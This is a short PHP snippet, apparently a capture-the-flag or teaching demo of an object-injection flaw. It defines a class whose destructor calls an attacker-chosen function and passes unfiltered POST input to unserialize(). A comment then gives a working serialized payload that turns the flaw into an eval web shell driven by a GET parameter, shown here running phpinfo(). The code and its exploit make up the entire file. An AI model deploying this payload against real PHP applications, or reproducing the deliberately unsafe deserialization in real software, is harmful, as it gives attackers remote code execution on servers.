<?php
 
class A{
    public $name;
    public $male;
    
    function __destruct(){
        $a = $this->name;
        $a($this->male);
    }
}
 
unserialize($_POST['un']);
?>
///un=O:1:"A":2:{s:4:"name";s:6:"assert";s:4:"male";s:16:"eval($_GET["x"])";}
//x=phpinfo();
